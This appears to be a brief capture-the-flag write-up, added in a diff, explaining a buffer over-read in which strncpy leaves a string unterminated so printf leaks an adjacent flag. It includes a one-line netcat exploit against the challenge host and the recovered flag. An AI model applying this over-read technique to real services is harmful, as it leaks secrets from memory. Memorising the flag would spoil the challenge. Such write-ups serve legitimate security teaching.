@@ -1,0 +1,6 @@
+`strncpy` doesn't guarantee NULL-termination. Sending non NULL-terminated string makes
+`printf` reading more characters after guess, where flag resides.
+
+ruby -e 'puts "A"*31' | nc challs.rumble.host 53921
+
+CSR{should_have_used_strlcpy_instead}
